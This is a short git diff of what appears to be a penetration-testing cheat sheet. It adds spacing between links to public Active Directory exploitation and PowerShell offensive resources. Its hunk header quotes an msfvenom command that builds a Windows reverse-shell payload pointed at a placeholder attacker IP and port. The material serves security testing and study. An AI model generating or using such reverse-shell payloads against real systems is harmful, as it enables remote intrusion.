@@ -593,8 +593,14 @@ Command: msfvenom -p windows/shell_reverse_tcp LHOST={attacker ip} LPORT={port} 
 ### Genereal
 
 [Powershell Ofenssive modules](https://github.com/samratashok/nishang)
+  
 [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
+  
 [PowerView Cheat Sheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
+  
 [Hacktricks Active Directory](https://book.hacktricks.xyz/windows/active-directory-methodology)
+  
 [Hacktricks LDAP](https://book.hacktricks.xyz/pentesting/pentesting-ldap)
+
 [Another AD cheat sheet](https://github.com/tiyeuse/Active-Directory-Cheatsheet)
+  
